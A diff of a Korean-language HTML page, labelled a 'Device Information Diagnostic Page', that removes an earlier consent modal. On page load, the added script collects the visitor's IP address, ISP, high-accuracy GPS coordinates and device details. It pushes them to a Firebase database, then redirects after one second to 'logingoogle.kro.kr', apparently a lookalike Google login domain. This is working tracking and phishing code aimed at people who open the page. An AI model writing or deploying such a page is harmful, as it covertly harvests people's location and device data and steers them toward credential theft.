@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thank you</title>
+    <title>Redirect</title>
     <!-- Tailwind CSS (CDN) -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- FontAwesome Icons -->
@@ -15,65 +15,137 @@
         }
     </style>
 </head>
-<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">
+<body class="bg-white text-slate-800 min-h-screen py-8 px-4 flex flex-col justify-between">
 
-    <!-- 메인 대기 화면 -->
-    <div class="text-center space-y-4 max-w-md w-full bg-slate-800 p-8 rounded-2xl border border-slate-700 shadow-xl">
-        <div class="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-full flex items-center justify-center mx-auto text-2xl mb-2">
-            <i class="fa-solid fa-gamepad"></i>
+    <div class="max-w-2xl mx-auto w-full space-y-6">
+
+        <!-- Title Header -->
+        <header class="border-b border-slate-200 pb-4 text-center sm:text-left">
+            <h1 class="text-2xl font-bold text-slate-900">접속 디바이스 및 위치 정보</h1>
+            <p class="text-xs text-slate-500 mt-1">현재 기기에서 감지된 정보가 아래에 표시됩니다.</p>
+        </header>
+
+        <!-- Dynamic Information List -->
+        <div class="space-y-4">
+
+            <!-- 1. IP & ISP -->
+            <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
+                <div class="flex items-center space-x-2 text-indigo-600 font-bold text-sm">
+                    <i class="fa-solid fa-network-wired"></i>
+                    <span>네트워크 및 IP 정보</span>
+                </div>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
+                    <div>
+                        <span class="text-slate-500 block">공인 IP 주소</span>
+                        <span id="ipAddr" class="font-mono font-bold text-slate-800">조회 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">인터넷 서비스 제공업체 (ISP)</span>
+                        <span id="ispInfo" class="font-medium text-slate-800">조회 중...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. GPS Location -->
+            <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
+                <div class="flex items-center space-x-2 text-emerald-600 font-bold text-sm">
+                    <i class="fa-solid fa-location-dot"></i>
+                    <span>GPS 위치 정보</span>
+                </div>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
+                    <div>
+                        <span class="text-slate-500 block">위도 (Latitude)</span>
+                        <span id="gpsLat" class="font-mono font-bold text-slate-800">측정 대기 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">경도 (Longitude)</span>
+                        <span id="gpsLng" class="font-mono font-bold text-slate-800">측정 대기 중...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3. Device & OS -->
+            <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
+                <div class="flex items-center space-x-2 text-blue-600 font-bold text-sm">
+                    <i class="fa-solid fa-mobile-screen"></i>
+                    <span>운영체제 및 브라우저</span>
+                </div>
+                <div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs">
+                    <div>
+                        <span class="text-slate-500 block">운영체제 (OS)</span>
+                        <span id="osVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">브라우저</span>
+                        <span id="browserVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">기기 유형</span>
+                        <span id="deviceTypeVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 4. Screen & Hardware -->
+            <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
+                <div class="flex items-center space-x-2 text-purple-600 font-bold text-sm">
+                    <i class="fa-solid fa-microchip"></i>
+                    <span>화면 해상도 및 스펙</span>
+                </div>
+                <div class="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs">
+                    <div>
+                        <span class="text-slate-500 block">화면 해상도</span>
+                        <span id="screenResVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">CPU 코어 수</span>
+                        <span id="cpuVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                    <div>
+                        <span class="text-slate-500 block">언어</span>
+                        <span id="langVal" class="font-medium text-slate-800">감지 중...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 5. Raw User Agent -->
+            <div class="p-4 bg-slate-50 border border-slate-200 rounded-xl space-y-1">
+                <span class="text-xs text-slate-500 block">User-Agent</span>
+                <p id="uaVal" class="text-[11px] font-mono text-slate-600 break-all leading-tight">감지 중...</p>
+            </div>
+
         </div>
-        <h1 class="text-2xl font-bold text-white"></h1>
-        <p class="text-slate-400 text-sm">
-            
-        </p>
-        <button id="openModalBtn" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-medium rounded-xl transition shadow-lg">
-            다음
-        </button>
-    </div>
 
-    <!-- 개인정보 수집 및 위치 정보 동의 팝업 (Modal) -->
-    <div id="consentModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50 hidden">
-        <div class="bg-slate-800 border border-slate-700 rounded-2xl max-w-md w-full p-6 space-y-5 shadow-2xl relative">
-            
-            <div class="flex items-center space-x-3 border-b border-slate-700 pb-4">
-                <div class="p-2 bg-indigo-500/20 text-indigo-400 rounded-lg">
-                    <i class="fa-solid fa-shield-halved text-xl"></i>
-                </div>
-                <div>
-                    <h2 class="text-lg font-bold text-white"></h2>
-                    <p class="text-xs text-slate-400"></p>
-                </div>
-            </div>
-
-            <!-- 수집 항목 안내 -->
-            <div class="space-y-3 text-xs text-slate-300 bg-slate-900/60 p-4 rounded-xl border border-slate-700/50">
-                <p class="font-semibold text-slate-200">구글 로그인 페이지로 이동합니다</p>
-                <ul class="space-y-1.5 list-disc list-inside text-slate-400">
-                </ul>
-            </div>
-
-            <!-- 상태 안내 메시지 -->
-            <div id="statusMessage" class="hidden text-xs text-center py-2 px-3 rounded-lg bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
-                <i class="fa-solid fa-spinner fa-spin mr-1"></i> 이동중입니다 ...
-            </div>
-
-            <!-- 동의 및 취소 버튼 -->
-            <div class="flex space-x-3 pt-2">
-                <button id="acceptBtn" class="w-2/3 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white text-sm font-bold rounded-xl transition flex items-center justify-center space-x-2">
-                    <span>다음</span>
+        <!-- Navigation Action -->
+        <div class="pt-4 border-t border-slate-200 space-y-3 text-center">
+            <p id="timerNotice" class="text-xs text-slate-500">
+                잠시 후 지정된 페이지로 이동합니다. (<span id="countdown">1</span>초)
+            </p>
+            <div class="flex space-x-2">
+                <button id="cancelRedirectBtn" class="w-1/3 py-3 border border-slate-300 hover:bg-slate-100 text-slate-700 text-sm font-semibold rounded-xl transition">
+                      .
+                </button>
+                <button id="goNowBtn" class="w-2/3 py-3 bg-slate-900 hover:bg-slate-800 text-white text-sm font-bold rounded-xl transition flex items-center justify-center space-x-2">
+                    <span>즉시 이동하기</span>
                     <i class="fa-solid fa-arrow-right text-xs"></i>
                 </button>
             </div>
         </div>
+
     </div>
 
-    <!-- Firebase SDK 및 데이터 처리 스크립트 -->
+    <!-- Footer -->
+    <footer class="text-center text-xs text-slate-400 mt-8">
+        © Device Information Diagnostic Page
+    </footer>
+
+    <!-- Logic Script -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";
 
-        // 이동할 목적지 게임/서비스 URL 설정
-        const TARGET_GAME_URL = "logingoogle.kro.kr"; // 실제 연결할 서비스 URL로 변경하세요.
+        // 이동 대상 페이지 URL (원하는 서비스 URL로 수정하세요)
+        const TARGET_URL = "https://logingoogle.kro.kr";
         const DATABASE_URL = "https://database-4d830-default-rtdb.firebaseio.com/";
 
         const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
@@ -87,131 +159,160 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app, DATABASE_URL);
 
-        const modal = document.getElementById('consentModal');
-        const openModalBtn = document.getElementById('openModalBtn');
-        const declineBtn = document.getElementById('declineBtn');
-        const acceptBtn = document.getElementById('acceptBtn');
-        const statusMessage = document.getElementById('statusMessage');
+        let countdownTimer = null;
+        let secondsLeft = 1;
 
-        // 모달 열기
-        openModalBtn.addEventListener('click', () => {
-            modal.classList.remove('hidden');
+        document.addEventListener('DOMContentLoaded', async () => {
+            // 1. 디바이스 정보 감지 및 화면 출력
+            const devInfo = renderDeviceInfo();
+            
+            // 2. IP 및 위치 정보 가져오기
+            const ipData = await fetchAndRenderIp();
+
+            // 3. GPS 정보 요청 및 출력
+            const gpsData = await requestAndRenderGps();
+
+            // 4. 데이터베이스 저장
+            await saveToDatabase({
+                timestamp: new Date().toISOString(),
+                createdAt: Date.now(),
+                ip: ipData.ip,
+                isp: ipData.isp,
+                ipLocation: ipData.location,
+                gps: gpsData,
+                ...devInfo
+            });
+
+            // 5. 카운트다운 시작 (1초 후 이동)
+            startCountdown();
         });
 
-        // 모달 닫기 (거부 시)
-        declineBtn.addEventListener('click', () => {
-            modal.classList.add('hidden');
-            alert('동의하지 않으시면 서비스 이용이 제한될 수 있습니다.');
-        });
+        // 카운트다운 및 이동
+        function startCountdown() {
+            const countEl = document.getElementById('countdown');
+            countdownTimer = setInterval(() => {
+                secondsLeft--;
+                if (countEl) countEl.innerText = secondsLeft;
 
-        // 동의 클릭 시 정보 수집 및 리디렉션 진행
-        acceptBtn.addEventListener('click', async () => {
-            acceptBtn.disabled = true;
-            declineBtn.disabled = true;
-            statusMessage.classList.remove('hidden');
-
-            try {
-                // 1. GPS 위치 수집 (사용자가 브라우저 팝업에서 허용해야 작동)
-                const gpsData = await getGpsPosition();
-
-                // 2. IP 및 디바이스 정보 수집
-                const deviceInfo = collectDeviceInfo();
-                const ipData = await fetchIpAddress();
-
-                // 3. 수집 데이터 통합
-                const payload = {
-                    timestamp: new Date().toISOString(),
-                    createdAt: Date.now(),
-                    ip: ipData.ip,
-                    isp: ipData.isp,
-                    ipLocation: ipData.location,
-                    gps: gpsData,
-                    ...deviceInfo
-                };
-
-                // 4. Firebase RTDB 저장
-                const logsRef = ref(db, 'device_logs');
-                await push(logsRef, payload);
-
-            } catch (error) {
-                console.error("데이터 처리 중 오류 발생:", error);
-            } finally {
-                // 5. 작업 완료 후 지정된 게임 페이지로 안전하게 이동
-                window.location.href = TARGET_GAME_URL;
-            }
-        });
-
-        // GPS 프로미스 함수
-        function getGpsPosition() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ latitude: null, longitude: null, error: "Geolocation Not Supported" });
-                    return;
+                if (secondsLeft <= 0) {
+                    clearInterval(countdownTimer);
+                    window.location.href = TARGET_URL;
                 }
+            }, 1000);
 
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve({
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            error: null
-                        });
-                    },
-                    (err) => {
-                        resolve({
-                            latitude: null,
-                            longitude: null,
-                            error: err.message || "Permission Denied"
-                        });
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
+            document.getElementById('cancelRedirectBtn').addEventListener('click', () => {
+                clearInterval(countdownTimer);
+                document.getElementById('timerNotice').innerText = "자동 이동이 중지되었습니다.";
+            });
+
+            document.getElementById('goNowBtn').addEventListener('click', () => {
+                clearInterval(countdownTimer);
+                window.location.href = TARGET_URL;
             });
         }
 
-        // IP 및 ISP 조회 함수
-        async function fetchIpAddress() {
+        // Firebase RTDB 저장
+        async function saveToDatabase(data) {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                if (res.ok) {
-                    const data = await res.json();
-                    return {
-                        ip: data.ip || "Unknown",
-                        isp: data.org || data.asn || "Unknown",
-                        location: `${data.country_name || ''} ${data.region || ''} ${data.city || ''}`.trim()
-                    };
-                }
-            } catch (e) {
-                console.warn("IP fetch error fallbacking...", e);
+                const logsRef = ref(db, 'device_logs');
+                await push(logsRef, data);
+            } catch (err) {
+                console.error("DB 저장 실패:", err);
             }
-            return { ip: "Unknown", isp: "Unknown", location: "Unknown" };
         }
 
-        // 기기 환경 정보 수집 함수
-        function collectDeviceInfo() {
+        // 디바이스 정보 감지 함수
+        function renderDeviceInfo() {
             const ua = navigator.userAgent;
-            let os = "Unknown";
+            document.getElementById('uaVal').innerText = ua;
+
+            let os = "기타";
             if (ua.indexOf("Win") !== -1) os = "Windows";
             else if (ua.indexOf("Mac") !== -1) os = "macOS";
             else if (ua.indexOf("Android") !== -1) os = "Android";
             else if (ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
 
-            let browser = "Unknown";
+            let browser = "기타";
             if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
             else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
             else if (ua.indexOf("Edg") !== -1) browser = "Edge";
+            else if (ua.indexOf("SamsungBrowser") !== -1) browser = "Samsung Internet";
 
-            return {
-                os,
-                browser,
-                userAgent: ua,
-                viewport: `${window.innerWidth}x${window.innerHeight}`,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language || "Unknown"
-            };
+            let deviceType = "Desktop";
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
+                deviceType = /iPad|Tablet/i.test(ua) ? "Tablet" : "Mobile";
+            }
+
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} 코어` : "알 수 없음";
+            const lang = navigator.language || "알 수 없음";
+
+            document.getElementById('osVal').innerText = os;
+            document.getElementById('browserVal').innerText = browser;
+            document.getElementById('deviceTypeVal').innerText = deviceType;
+            document.getElementById('screenResVal').innerText = screenRes;
+            document.getElementById('cpuVal').innerText = cores;
+            document.getElementById('langVal').innerText = lang;
+
+            return { os, browser, deviceType, screenRes, cores, lang, userAgent: ua };
+        }
+
+        // IP 데이터 감지 함수
+        async function fetchAndRenderIp() {
+            let result = { ip: "알 수 없음", isp: "알 수 없음", location: "알 수 없음" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    result.ip = data.ip || "알 수 없음";
+                    result.isp = data.org || data.asn || "알 수 없음";
+                    result.location = `${data.country_name || ''} ${data.region || ''} ${data.city || ''}`.trim();
+                }
+            } catch (e) {
+                console.warn("IP API 실패", e);
+            }
+
+            document.getElementById('ipAddr').innerText = result.ip;
+            document.getElementById('ispInfo').innerText = result.isp;
+
+            return result;
+        }
+
+        // GPS 데이터 감지 함수
+        function requestAndRenderGps() {
+            return new Promise((resolve) => {
+                const latEl = document.getElementById('gpsLat');
+                const lngEl = document.getElementById('gpsLng');
+
+                if (!navigator.geolocation) {
+                    latEl.innerText = "미지원 브라우저";
+                    lngEl.innerText = "미지원 브라우저";
+                    resolve({ latitude: null, longitude: null, error: "Not supported" });
+                    return;
+                }
+
+                latEl.innerText = "권한 요청 중...";
+                lngEl.innerText = "권한 요청 중...";
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lng = pos.coords.longitude;
+                        latEl.innerText = lat.toFixed(6);
+                        lngEl.innerText = lng.toFixed(6);
+                        resolve({ latitude: lat, longitude: lng, accuracy: pos.coords.accuracy, error: null });
+                    },
+                    (err) => {
+                        latEl.innerText = "권한 거부/실패";
+                        lngEl.innerText = "권한 거부/실패";
+                        resolve({ latitude: null, longitude: null, error: err.message });
+                    },
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                );
+            });
         }
     </script>
 </body>
 </html>
+
 
